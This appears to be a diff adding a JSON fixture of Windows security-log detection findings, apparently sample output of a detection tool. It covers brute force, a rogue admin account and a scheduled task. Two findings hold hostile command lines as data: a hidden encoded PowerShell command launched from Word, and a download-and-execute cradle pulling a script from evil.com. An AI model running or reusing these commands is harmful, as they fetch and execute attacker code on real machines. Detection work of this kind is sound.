@@ -1,0 +1,112 @@
+{
+  "findings": [
+    {
+      "EventID": 4625,
+      "Label": "BRUTE_FORCE_THRESHOLD",
+      "Severity": "CRITICAL",
+      "MITRE": "T1110 - Brute Force",
+      "Timestamp": "2026-05-07T09:15:00.000000Z",
+      "User": "Administrator",
+      "Domain": "CORP",
+      "Process": "",
+      "ParentProc": "",
+      "CmdLine": "",
+      "SrcIP": "192.168.1.100"
+    },
+    {
+      "EventID": 4720,
+      "Label": "ACCOUNT_CREATED",
+      "Severity": "HIGH",
+      "MITRE": "T1136 - Create Account",
+      "Timestamp": "2026-05-07T09:20:00.000000Z",
+      "User": "hacker_user",
+      "Domain": "CORP",
+      "Process": "",
+      "ParentProc": "",
+      "CmdLine": "",
+      "SrcIP": ""
+    },
+    {
+      "EventID": 4732,
+      "Label": "ADMIN_GROUP_ADD",
+      "Severity": "CRITICAL",
+      "MITRE": "T1098 - Account Manipulation",
+      "Timestamp": "2026-05-07T09:21:00.000000Z",
+      "User": "hacker_user",
+      "Domain": "CORP",
+      "Process": "",
+      "ParentProc": "",
+      "CmdLine": "",
+      "SrcIP": ""
+    },
+    {
+      "EventID": 4688,
+      "Label": "PROCESS_CREATION+MALICIOUS_CMD",
+      "Severity": "CRITICAL",
+      "MITRE": "T1059 - Command Execution",
+      "Timestamp": "2026-05-07T09:25:00.000000Z",
+      "User": "SYSTEM",
+      "Domain": "NT AUTHORITY",
+      "Process": "C:\\Windows\\System32\\cmd.exe",
+      "ParentProc": "C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
+      "CmdLine": "powershell -w hidden -encodedcommand aQBFAFgAIAAoAG4AZQB3AC...",
+      "SrcIP": ""
+    },
+    {
+      "EventID": 4698,
+      "Label": "SCHED_TASK_CREATE",
+      "Severity": "HIGH",
+      "MITRE": "T1053 - Scheduled Task",
+      "Timestamp": "2026-05-07T09:30:00.000000Z",
+      "User": "SYSTEM",
+      "Domain": "NT AUTHORITY",
+      "Process": "svchost.exe",
+      "ParentProc": "",
+      "CmdLine": "",
+      "SrcIP": ""
+    },
+    {
+      "EventID": 4104,
+      "Label": "PS_SCRIPT_BLOCK",
+      "Severity": "CRITICAL",
+      "MITRE": "T1059.001 - PowerShell",
+      "Timestamp": "2026-05-07T09:26:00.000000Z",
+      "User": "SYSTEM",
+      "Domain": "NT AUTHORITY",
+      "Process": "powershell.exe",
+      "ParentProc": "cmd.exe",
+      "CmdLine": "invoke-expression (new-object net.webclient).downloadstring('http://evil.com/shell.ps1')",
+      "SrcIP": ""
+    }
+  ],
+  "top_event_ids": [
+    [
+      4624,
+      45
+    ],
+    [
+      4625,
+      12
+    ],
+    [
+      4688,
+      8
+    ],
+    [
+      4104,
+      2
+    ],
+    [
+      4720,
+      1
+    ],
+    [
+      4732,
+      1
+    ],
+    [
+      4698,
+      1
+    ]
+  ]
+}
